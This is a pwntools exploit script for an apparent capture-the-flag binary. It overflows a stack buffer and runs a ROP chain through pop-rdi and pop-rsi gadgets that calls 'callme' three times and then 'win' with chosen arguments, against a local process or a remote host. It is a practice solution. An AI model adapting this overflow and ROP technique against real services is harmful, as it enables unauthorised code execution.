#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-02", checksec=True)


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

callme = elf.symbols["callme"]
win = elf.symbols["win"]
callme_arg = 0xdeadbeef
win_args = [0xbeefdead, 0xf00d]
pop_rdi = 0x401403
pop_rsi_r15 = 0x401401

pad = 0x20 + 0x8

payload = b"A" * pad
payload += flat(pop_rdi, callme_arg, callme)
payload += flat(pop_rdi, callme_arg, callme)
payload += flat(pop_rdi, callme_arg, callme)
payload += flat(pop_rdi, win_args[0],
                pop_rsi_r15, win_args[1], 0,
                win)

io.sendafter(b"Input: ", payload)

io.interactive()
